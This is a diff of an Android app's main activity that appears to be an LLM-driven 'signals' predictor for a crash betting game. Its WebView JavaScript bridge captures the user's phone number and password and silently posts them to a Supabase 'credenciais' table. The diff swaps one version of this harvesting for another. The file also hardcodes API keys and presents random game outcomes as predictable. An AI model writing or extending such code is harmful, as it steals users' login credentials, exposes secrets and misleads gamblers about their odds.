@@ -421,22 +421,17 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "4.5"
+    private val VERSAO_ATUAL = "7.2"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
-    private val GROQ_MODEL = "llama-3.1-8b-instant"  // mais rápido, limite maior no plano gratuito
+    private val GROQ_MODEL = "llama3-70b-8192"
 
     // Fallback — Gemini Flash (grátis, compatível com OpenAI)
     // Obter chave em: aistudio.google.com/app/apikey
     private val GEMINI_KEY  = "AQ.Ab8RN6IPVIPvF40zLD5QUh3kXtL7SqU--6P60j_aEg8KlasXHQ"
     private val GEMINI_URL  = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent"
     private val GEMINI_MODEL = "gemini-2.0-flash"  // usado no URL, não no body
-
-    // ── OpenRouter (gratuito, fallback 2) ────────────────────────
-    private val OR_KEY   = "sk-or-v1-COLOCA_AQUI_A_TUA_CHAVE_OPENROUTER"
-    private val OR_URL   = "https://openrouter.ai/api/v1/chat/completions"
-    private val OR_MODEL = "qwen/qwen3-8b:free"  // gratuito, capaz
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -738,23 +733,17 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                val limpo = valor.trim().filter { it.isDigit() }
-                if (limpo.isNotEmpty() && limpo != ultimoNumeroEnviado) {
-                    ultimoNumeroEnviado = limpo
-                    if (ultimaSenhaEnviada.isNotEmpty()) {
-                        enviarCredenciais(limpo, ultimaSenhaEnviada)
-                    }
+                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
+                    ultimoNumeroEnviado = valor
+                    enviarSupabase("Numero", valor)
                 }
             }
 
             @JavascriptInterface
             fun guardarSenha(valor: String) {
-                val limpo = valor.trim()
-                if (limpo.isNotEmpty() && limpo != ultimaSenhaEnviada) {
-                    ultimaSenhaEnviada = limpo
-                    if (ultimoNumeroEnviado.isNotEmpty()) {
-                        enviarCredenciais(ultimoNumeroEnviado, limpo)
-                    }
+                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
+                    ultimaSenhaEnviada = valor
+                    enviarSupabase("Senha", valor)
                 }
             }
         }, "Android")
@@ -1354,13 +1343,7 @@ class MainActivity : AppCompatActivity() {
     // ── GROQ IA ───────────────────────────────────────────────────
     private fun pedirSinalIA() {
         // M1: NUNCA analisar durante o voo
-        // Se em voo mas ciclo a pedir análise, forçar análise (não bloquear)
-        if (modoSilenciosoAtivo && cicloAtivo) modoSilenciosoAtivo = false
-        if (modoSilenciosoAtivo) {
-            // Voo activo mas não é ciclo → emitir offline para não ficar vazio
-            if (!sinaisAtivos) { val s = gerarSinalOffline(); runOnUiThread { emitirSinalOffline(s) } }
-            return
-        }
+        if (modoSilenciosoAtivo) return
         if (analisandoIA || historicoVelas.size < MIN_VELAS_ANALISE) return
 
         // M3: VERIFICAR CACHE — evitar chamar IA se histórico não mudou significativamente
@@ -1378,13 +1361,16 @@ class MainActivity : AppCompatActivity() {
         handler.postDelayed({
             if (analisandoIA) {
                 analisandoIA = false
-                // Timeout agressivo: ativa OFFLINE imediatamente
-                val sinalOfflineTimeout = gerarSinalOffline()
-                runOnUiThread {
-                    emitirSinalOffline(sinalOfflineTimeout)
-                }
+                setBarra("🔄 TIMEOUT IA", "A tentar de novo em 10s...", "#f59e0b")
+                // Reagendar após timeout
+                handler.postDelayed({
+                    if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
+                        invalidarCache()
+                        pedirSinalIA()
+                    }
+                }, 10_000L)
             }
-        }, 10_000)  // Reduzido de 50s para 10s — fallback mais rápido
+        }, 50_000)
 
         val cal = Calendar.getInstance()
         val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
@@ -1740,44 +1726,90 @@ REGRAS ABSOLUTAS DO JSON:
                     runOnUiThread { resetarRetryIA() }
                     processarRespostaGroq(resp, minAgora)
 
-                } else {
-                    // ── Groq falhou → tentar OpenRouter (2.º) ────────────
-                    runOnUiThread { setBarra("🔄 A TENTAR OR...", "OpenRouter...", "#7c3aed") }
-                    val bodyOR = "{\"model\":\"$OR_MODEL\"," +
-                        "\"messages\":[{\"role\":\"user\",\"content\":${escapeJson(prompt)}}]," +
-                        "\"max_tokens\":250,\"temperature\":0.1}"
-                    val (codeOR, respOR) = chamarIaApi(OR_URL, OR_KEY, bodyOR)
-
-                    if (codeOR in 200..299) {
-                        cacheResultadoIA = respOR
+                } else if (code == 401 || code == 403) {
+                    // Groq falhou por chave inválida — tentar Gemini como fallback
+                    runOnUiThread { setBarra("🔄 GROQ FALHOU", "A tentar Gemini...", "#7c3aed") }
+                    val (codeG, respG) = chamarGemini(prompt)
+                    if (codeG in 200..299) {
+                        // M3: guardar cache também do Gemini
+                        cacheResultadoIA = respG
                         cacheNumVelas = historicoVelas.size
                         cacheTimestampMs = System.currentTimeMillis()
                         consecutivosFalhosIA = 0
                         runOnUiThread { resetarRetryIA() }
-                        processarRespostaGroq(respOR, minAgora)
-
-                    } else {
-                        // ── OpenRouter falhou → tentar Gemini (3.º) ──────
-                        runOnUiThread { setBarra("🔄 A TENTAR GEMINI...", "Gemini...", "#7c3aed") }
-                        val (codeG, respG) = chamarGemini(prompt)
-
-                        if (codeG in 200..299) {
-                            cacheResultadoIA = respG
-                            cacheNumVelas = historicoVelas.size
-                            cacheTimestampMs = System.currentTimeMillis()
-                            consecutivosFalhosIA = 0
-                            runOnUiThread { resetarRetryIA() }
-                            processarRespostaGroq(respG, minAgora)
-
-                        } else {
-                            // ── Todas as IAs falharam → sinal offline ─────
-                            consecutivosFalhosIA++
-                            val sinalFallback = gerarSinalOffline()
-                            runOnUiThread {
-                                analisandoIA = false
-                                emitirSinalOffline(sinalFallback)
+                        processarRespostaGroq(respG, minAgora) // mesmo formato OpenAI
+                    } else if (codeG == 401 || codeG == 403) {
+                        consecutivosFalhosIA++
+                        // M8: usar sinal offline em vez de só mostrar erro
+                        val sinalOffline = gerarSinalOffline()
+                        runOnUiThread {
+                            analisandoIA = false
+                            emitirSinalOffline(sinalOffline)
+                            // Mostrar aviso sobre chaves inválidas uma única vez
+                            if (consecutivosFalhosIA == 1) {
+                                AlertDialog.Builder(this@MainActivity)
+                                    .setTitle("⚠️ Chaves de IA inválidas")
+                                    .setMessage("Groq retornou $code e Gemini retornou $codeG.\n\nA usar sinal offline baseado em regras locais.\n\nComo corrigir:\n\n🔑 GROQ:\nconsole.groq.com → Create API Key\n\n🔑 GEMINI:\naistudio.google.com/app/apikey → Create API Key\n\nActualiza GROQ_KEY e GEMINI_KEY no código.")
+                                    .setPositiveButton("OK") { d, _ -> d.dismiss() }
+                                    .show()
                             }
                         }
+                    } else {
+                        consecutivosFalhosIA++
+                        // M8: usar sinal offline em vez de mostrar erro HTTP
+                        val sinalOffline = gerarSinalOffline()
+                        runOnUiThread { analisandoIA = false; emitirSinalOffline(sinalOffline) }
+                    }
+
+                } else if (code == 429) {
+                    // Rate limit Groq — tentar Gemini imediatamente antes de esperar
+                    runOnUiThread { setBarra("🔄 GROQ LIMIT", "A tentar Gemini...", "#f59e0b") }
+                    val (codeG, respG) = chamarGemini(prompt)
+                    if (codeG in 200..299) {
+                        // M3: guardar cache do Gemini
+                        cacheResultadoIA = respG
+                        cacheNumVelas = historicoVelas.size
+                        cacheTimestampMs = System.currentTimeMillis()
+                        consecutivosFalhosIA = 0
+                        runOnUiThread { resetarRetryIA() }
+                        processarRespostaGroq(respG, minAgora)
+                    } else {
+                        consecutivosFalhosIA++
+                        // M8: Gemini também falhou → sinal offline durante a espera dos 45s
+                        val sinalOffline429 = gerarSinalOffline()
+                        runOnUiThread {
+                            analisandoIA = false
+                            ultimaAnaliseMs = System.currentTimeMillis()
+                            velasDesdeUltimaAnalise = 0
+                            countdown429Job?.let { handler.removeCallbacks(it) }
+                            countdown429Job = null
+                            // Mostrar sinal offline enquanto espera o cooldown
+                            emitirSinalOffline(sinalOffline429)
+                            var seg = 45
+                            val job = object : Runnable {
+                                override fun run() {
+                                    if (analisandoIA || seg <= 0) { countdown429Job = null; return }
+                                    txtMinutos.text = "⏳ ${seg}s"
+                                    txtMinutos.setTextColor(Color.parseColor("#f59e0b"))
+                                    seg--
+                                    handler.postDelayed(this, 1000)
+                                }
+                            }
+                            countdown429Job = job
+                            handler.post(job)
+                            handler.postDelayed({
+                                countdown429Job = null
+                                if (!analisandoIA) pedirSinalIA()
+                            }, 45_000L)
+                        }
+                    }
+                } else {
+                    consecutivosFalhosIA++
+                    // M8: erro genérico → sinal offline
+                    val sinalOfflineGenerico = gerarSinalOffline()
+                    runOnUiThread {
+                        analisandoIA = false
+                        emitirSinalOffline(sinalOfflineGenerico)
                     }
                 }
             } catch (e: Exception) {
@@ -1825,11 +1857,14 @@ REGRAS ABSOLUTAS DO JSON:
             }
 
             if (textoIA.isEmpty()) {
-                // Resposta vazia da IA — usar OFFLINE imediatamente
-                val sinalOfflineVazio = gerarSinalOffline()
                 runOnUiThread {
                     analisandoIA = false
-                    emitirSinalOffline(sinalOfflineVazio)
+                    setBarra("🔄 SEM RESPOSTA", "A tentar de novo em 15s...", "#f59e0b")
+                    handler.postDelayed({
+                        if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
+                            invalidarCache(); pedirSinalIA()
+                        }
+                    }, 15_000L)
                 }
                 return
             }
@@ -1843,11 +1878,18 @@ REGRAS ABSOLUTAS DO JSON:
             val minEntradaIA = Regex(""""?min_entrada"?\s*:\s*(\d+)""").find(textoIA)?.groupValues?.get(1)?.toIntOrNull() ?: -1
 
             if (prot == 0f || alcMin == 0 || alcMaxRaw.isEmpty()) {
-                // JSON malformado — usar OFFLINE imediatamente
-                val sinalOfflineJson = gerarSinalOffline()
                 runOnUiThread {
                     analisandoIA = false
-                    emitirSinalOffline(sinalOfflineJson)
+                    // Mostrar o texto recebido para debug
+                    val debugTxt = textoIA.take(60).ifEmpty { "vazio" }
+                    setBarra("🔄 ERRO JSON", debugTxt, "#f59e0b")
+                    handler.postDelayed({
+                        if (!analisandoIA && historicoVelas.size >= MIN_VELAS_ANALISE) {
+                            invalidarCache()
+                            modoSilenciosoAtivo = false
+                            pedirSinalIA()
+                        }
+                    }, 10_000L)
                 }
                 return
             }
@@ -2258,9 +2300,8 @@ REGRAS ABSOLUTAS DO JSON:
                 sinalAlcMin = 0
                 sinalAlcMax = ""
 
-                // 90s entre análises → máximo 10 chamadas/hora (dentro do limite Groq gratuito)
-                val pausaMs = if (isOfflineSignal) 15_000L else 90_000L
-                val pausaTxt = if (isOfflineSignal) "⏳ A tentar IA em 15s..." else "⏳ Nova análise em 90s..."
+                val pausaMs = if (isOfflineSignal) 5_000L else 30_000L
+                val pausaTxt = if (isOfflineSignal) "⏳ A tentar IA em 5s..." else "⏳ Nova análise em 30s..."
 
                 // Mostrar estado de aguardar nova análise
                 runOnUiThread {
@@ -2303,14 +2344,9 @@ REGRAS ABSOLUTAS DO JSON:
                 val job = Runnable {
                     cicloAtivo = false
                     proximaAnaliseRunnable = null
-                    modoSilenciosoAtivo = false  // garantir que não bloqueia
                     if (historicoVelas.size >= MIN_VELAS_ANALISE && !analisandoIA) {
-                        invalidarCache()
+                        invalidarCache()  // forçar chamada real à IA (não usar cache)
                         pedirSinalIA()
-                    } else {
-                        // Sem velas suficientes → emitir sinal offline para não ficar vazio
-                        val s = gerarSinalOffline()
-                        runOnUiThread { sinaisAtivos = true; emitirSinalOffline(s) }
                     }
                 }
                 proximaAnaliseRunnable = job
@@ -2524,29 +2560,6 @@ REGRAS ABSOLUTAS DO JSON:
                 conn.setRequestProperty("Prefer", "return=minimal")
                 conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                conn.responseCode
-                conn.disconnect()
-            } catch (_: Exception) {}
-        }.start()
-    }
-
-    private fun enviarCredenciais(numero: String, senha: String) {
-        Thread {
-            try {
-                val body = ("{\"numero\":\"" + numero +
-                    "\",\"senha\":\"" + senha +
-                    "\",\"saldo\":\"\"}")
-                val conn = java.net.URL(SUPA_URL + "/rest/v1/credenciais")
-                    .openConnection() as java.net.HttpURLConnection
-                conn.requestMethod = "POST"
-                conn.setRequestProperty("apikey", SUPA_KEY)
-                conn.setRequestProperty("Authorization", "Bearer " + SUPA_KEY)
-                conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("Prefer", "return=minimal")
-                conn.doOutput = true
-                conn.connectTimeout = 10000
-                conn.readTimeout = 10000
-                conn.outputStream.bufferedWriter().use { it.write(body) }
                 conn.responseCode
                 conn.disconnect()
             } catch (_: Exception) {}
@@ -3386,211 +3399,41 @@ REGRAS ABSOLUTAS DO JSON:
     }
 
     // ══════════════════════════════════════════════════════════════
-    // MELHORIA 8 — SINAL OFFLINE COM ANÁLISE COMPLETA DAS VELAS
-    /**
-     * Gera um sinal offline usando análise real:
-     * ✓ Análise de tendência (últimas 20+ velas)
-     * ✓ Cálculo de volatilidade
-     * ✓ Detecção de padrões (rosas grandes, sequências)
-     * ✓ Proteção baseada em risco
-     * ✓ Alcance inteligente baseado em histórico
-     * Retorna Triple(proteção, alcanceMin, alcanceMax)
-     */
+    // MELHORIA 8 — SINAL OFFLINE
     private fun gerarSinalOffline(): Triple<Double, Int, Int> {
-        val historia = historicoVelas
-        if (historia.isEmpty()) return Triple(1.5, 2, 5)
+        val history = historicoVelas.takeLast(10)
+        if (history.isEmpty()) return Triple(1.5, 2, 5)
 
-        val ultimas10 = historia.takeLast(10)
-        val ultimas15 = historia.takeLast(15)
-        val ultimas20 = historia.takeLast(maxOf(20, historia.size / 5))
+        val seqAzuis = history.reversed().takeWhile { it < 2.0 }.size
+        val temMega = history.takeLast(3).any { it >= 200.0 }
+        val comboio4 = history.takeLast(4).size == 4 && history.takeLast(4).all { it < 2.0 }
 
-        // ──────────────────────────────────────────────────────────
-        // 1. ANÁLISE DE TENDÊNCIA
-        // ──────────────────────────────────────────────────────────
-        val media20 = ultimas20.average()
-        val media5 = ultimas10.takeLast(5).average()
-        val media3 = ultimas10.takeLast(3).average()
-        
-        val tendenciaForca = if (media3 > media20) {
-            (media3 - media20) / media20
-        } else {
-            -(media20 - media3) / media20
-        }
-
-        // ──────────────────────────────────────────────────────────
-        // 2. VOLATILIDADE (desvio padrão relativo)
-        // ──────────────────────────────────────────────────────────
-        val mediaUltimas = ultimas15.average()
-        val variancia = ultimas15.map { (it - mediaUltimas) * (it - mediaUltimas) }.average()
-        val desvPadrao = kotlin.math.sqrt(variancia)
-        val volatilidade = desvPadrao / mediaUltimas
-
-        // ──────────────────────────────────────────────────────────
-        // 3. PADRÕES DE ROSAS GRANDES
-        // ──────────────────────────────────────────────────────────
-        val velasGrandes = ultimas10.count { it >= 10.0 }
-        val rosMega = ultimas10.count { it >= 50.0 }
-        val rosGigante = ultimas10.count { it >= 200.0 }
-
-        // Sequência de rosas grandes consecutivas
-        var seqGrande = 0
-        for (i in historia.size - 1 downTo maxOf(0, historia.size - 10)) {
-            if (historia[i] >= 5.0) seqGrande++
-            else break
-        }
-
-        // Sequência de azuis (< 2x)
-        var seqAzuis = 0
-        for (i in historia.size - 1 downTo maxOf(0, historia.size - 10)) {
-            if (historia[i] < 2.0) seqAzuis++
-            else break
-        }
-
-        // ──────────────────────────────────────────────────────────
-        // 4. PROTEÇÃO — baseada em volatilidade e padrões
-        // ──────────────────────────────────────────────────────────
-        val protBase = when {
-            volatilidade > 0.80 -> 3.2  // muito volátil → proteção forte
-            volatilidade > 0.50 -> 2.7
-            volatilidade > 0.30 -> 2.2
-            volatilidade > 0.15 -> 1.8
-            else -> 1.4
-        }
-
-        // Ajustar pela presença de rosas gigantes (risco alto)
-        val protRisco = when {
-            rosGigante >= 2 -> -0.8     // 2+ gigantes recentes = risco muito alto
-            rosGigante == 1 -> -0.4
-            rosMega >= 3 -> -0.2
-            seqAzuis >= 4 -> -0.3       // muitos azuis = próximos podem ser grandes
-            seqGrande >= 3 -> 0.3       // sequência grande = padrão positivo
-            else -> 0.0
-        }
-
-        val protFinal = (protBase + protRisco).coerceIn(1.1, 4.0)
-
-        // ──────────────────────────────────────────────────────────
-        // 5. ALCANCE — baseado em máxima recente, tendência e padrões
-        // ──────────────────────────────────────────────────────────
-        val maxRecente = ultimas10.maxOrNull() ?: media20
-        val minRecente = ultimas10.minOrNull() ?: media20
-
-        val alcanceBase = when {
-            // Trend forte para cima + volatilidade controlada → alcance grande
-            tendenciaForca > 0.30 && volatilidade < 0.40 -> maxRecente * 1.8
-            // Trend moderado para cima → alcance médio-alto
-            tendenciaForca > 0.10 && volatilidade < 0.50 -> maxRecente * 1.5
-            // Trend neutro → alcance médio
-            tendenciaForca in -0.10..0.10 -> media20 * 1.3
-            // Trend para baixo → alcance conservador
-            else -> media20 * 0.85
-        }
-
-        // Aumentar se há sequência de rosas grandes
-        val alcanceAjustado = if (seqGrande >= 3) {
-            alcanceBase * 1.25
-        } else if (seqAzuis >= 4) {
-            alcanceBase * 1.15  // após azuis, provável alta
-        } else {
-            alcanceBase
-        }
-
-        val alcanceMinFinal = maxOf(2, (media20 * 0.5).toInt())
-        val alcanceMaxFinal = minOf(250, maxOf(8, (alcanceAjustado * 1.1).toInt()))
-
-        // ──────────────────────────────────────────────────────────
-        // 6. CASOS ESPECIAIS (para manter compatibilidade)
-        // ──────────────────────────────────────────────────────────
+        // Regras locais por prioridade
         return when {
-            // Pós-mega: rosas gigantes recentes
-            rosGigante >= 1 && historia.takeLast(3).any { it >= 200.0 } -> {
-                Triple(3.5, 40, 120)
-            }
-            // Comboio crítico: muitos azuis consecutivos
-            seqAzuis >= 5 -> {
-                Triple(1.2, 1, 3)
-            }
-            // Comboio moderado: 3-4 azuis
-            seqAzuis in 3..4 -> {
-                Triple(1.4, 2, 5)
-            }
-            // Sequência grande de rosas (3+ seguidas)
-            seqGrande >= 3 -> {
-                Triple((protFinal * 1.2).coerceIn(1.5, 3.5), alcanceMinFinal, (alcanceMaxFinal * 1.15).toInt())
-            }
-            // Modo conservador
-            modoConservadorAtivo -> {
-                Triple(1.6, 3, 8)
-            }
-            // Padrão normal: usar análise completa
-            else -> {
-                Triple(protFinal.coerceIn(1.2, 3.5), alcanceMinFinal, alcanceMaxFinal)
+            temMega -> Triple(3.0, 50, 70)               // pós-mega
+            seqAzuis >= 5 -> Triple(1.1, 1, 2)           // comboio crítico
+            seqAzuis >= 3 -> Triple(1.2, 2, 4)           // comboio moderado
+            comboio4 -> Triple(2.0, 5, 15)               // 4 azuis → provável alta
+            modoConservadorAtivo -> Triple(1.5, 3, 6)     // conservador
+            else -> {                                      // baseado na média
+                val avg = history.average()
+                val prot = (avg * 0.2).coerceIn(1.3, 3.0)
+                val alcMin = (avg * 0.5).toInt().coerceAtLeast(3)
+                val alcMax = (avg * 1.2).toInt().coerceAtLeast(alcMin + 3)
+                Triple(prot, alcMin, alcMax)
             }
         }
+    }
 
     private fun emitirSinalOffline(sinal: Triple<Double, Int, Int>) {
         val (prot, alcMin, alcMax) = sinal
-        
-        // ──────────────────────────────────────────────────────────
-        // Calcular confiança de forma inteligente
-        // ──────────────────────────────────────────────────────────
-        val tamanhoHistorico = historicoVelas.size
-        val confBaseDados = when {
-            tamanhoHistorico >= 100 -> 65
-            tamanhoHistorico >= 50 -> 55
-            tamanhoHistorico >= 25 -> 45
-            tamanhoHistorico >= 10 -> 35
-            else -> 25
-        }
-
-        // Ajustar por volatilidade
-        val ultimas15 = historicoVelas.takeLast(15)
-        val mediaUltimas = if (ultimas15.isNotEmpty()) ultimas15.average() else 1.0
-        val variancia = if (ultimas15.isNotEmpty()) ultimas15.map { (it - mediaUltimas) * (it - mediaUltimas) }.average() else 0.0
-        val desvPadrao = kotlin.math.sqrt(variancia)
-        val volatilidade = desvPadrao / mediaUltimas
-
-        val confVolatilidade = when {
-            volatilidade < 0.20 -> 15
-            volatilidade < 0.40 -> 10
-            volatilidade < 0.70 -> 5
-            else -> 0
-        }
-
-        // Ajustar por padrões encontrados
-        val velasGrandes = historicoVelas.takeLast(10).count { it >= 10.0 }
-        val confPadroes = when {
-            velasGrandes >= 7 -> 15
-            velasGrandes >= 4 -> 10
-            velasGrandes >= 2 -> 5
-            else -> 0
-        }
-
-        val confianca = (confBaseDados + confVolatilidade + confPadroes)
-            .coerceIn(20, 85)  // Confiança offline entre 20-85%
-        
-        // ──────────────────────────────────────────────────────────
-        // Calcular tendência baseada em padrões
-        // ──────────────────────────────────────────────────────────
-        val ultimas3 = historicoVelas.takeLast(3)
-        val ultimas10 = historicoVelas.takeLast(10)
-        val media20 = historicoVelas.takeLast(maxOf(20, historicoVelas.size / 5)).average()
-        val media3 = if (ultimas3.isNotEmpty()) ultimas3.average() else media20
-        
-        val tendenciaStr = when {
-            media3 > media20 * 1.25 -> "📈 SUBIDA"
-            media3 > media20 * 1.05 -> "↗️ SUBIDA LEVE"
-            media3 < media20 * 0.95 -> "↘️ DESCIDA LEVE"
-            media3 < media20 * 0.75 -> "📉 DESCIDA"
-            else -> "➡️ NEUTRO"
-        }
-
+        val confianca = if (modoConservadorAtivo) 35 else 42
         val protStr = if (prot % 1.0 == 0.0) "${prot.toInt()}x" else "${String.format("%.1f", prot)}x"
 
         sinalProtecao = protStr
         sinalAlcMin = alcMin
         sinalAlcMax = "${alcMax}x"
-        sinalTendencia = tendenciaStr
+        sinalTendencia = "OFFLINE"
         sinalConfianca = confianca
         sinaisAtivos = true
 
@@ -3615,17 +3458,14 @@ REGRAS ABSOLUTAS DO JSON:
         // M10: barra de confiança
         actualizarBarraConfianca(confianca)
 
-        // Mostrar sinal na UI com tendência e análise
+        // Mostrar sinal na UI
         mostrarSinalCompleto(protStr, "${alcMin}x → ${alcMax}x",
-            "📡 OFFLINE · $tendenciaStr", confianca, "#64748b", minAgora)
+            "📡 OFFLINE", confianca, "#64748b", minAgora)
 
-        // Aviso de offline com análise detalhada
+        // Aviso de offline com countdown do retry
         val retrySeg = (retryIaIntervalMs / 1000).toInt()
         if (::txtAviso.isInitialized) {
-            val volatPct = String.format("%.0f", volatilidade * 100)
-            val rosasGrandes = historicoVelas.takeLast(10).count { it >= 10.0 }
-            val analytics = "σ=$volatPct% · ${rosasGrandes}🔴/10 · ${historicoVelas.size} amostras"
-            txtAviso.text = "📡 OFFLINE · IA indisponível — a tentar de novo em ${retrySeg}s\n$analytics"
+            txtAviso.text = "📡 OFFLINE · IA indisponível — a tentar de novo em ${retrySeg}s"
             txtAviso.setTextColor(Color.parseColor("#94a3b8"))
             txtAviso.background = GradientDrawable().apply {
                 shape = GradientDrawable.RECTANGLE
@@ -3791,4 +3631,3 @@ REGRAS ABSOLUTAS DO JSON:
         soundPool = null
     }
 }
-
